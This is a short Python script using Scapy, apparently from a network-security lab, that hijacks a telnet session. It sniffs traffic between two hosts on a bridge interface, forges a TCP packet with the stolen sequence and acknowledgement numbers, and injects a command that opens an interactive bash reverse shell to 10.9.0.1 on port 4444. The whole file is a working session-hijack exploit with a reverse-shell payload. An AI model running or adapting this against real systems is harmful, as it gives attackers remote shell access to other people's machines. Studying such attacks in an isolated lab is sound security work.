from scapy.all import *

def spoof(pkt):
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4
    
    ip = IP(src=old_ip.dst, dst=old_ip.src)
    
    tcp = TCP(
        sport=old_tcp.dport,
        dport=old_tcp.sport,
        flags="A",
        seq=old_tcp.ack,
        ack=old_tcp.seq + tcp_len
    )
    
    data = "\n/bin/bash -i >& /dev/tcp/10.9.0.1/4444 0>&1\n"
    pkt = ip / tcp / data
    send(pkt, verbose=0)
    quit()

my_filter = "tcp and src host 10.9.0.7 and dst host 10.9.0.6 and src port 23"
sniff(iface="br-82e939624594", filter=my_filter, prn=spoof)
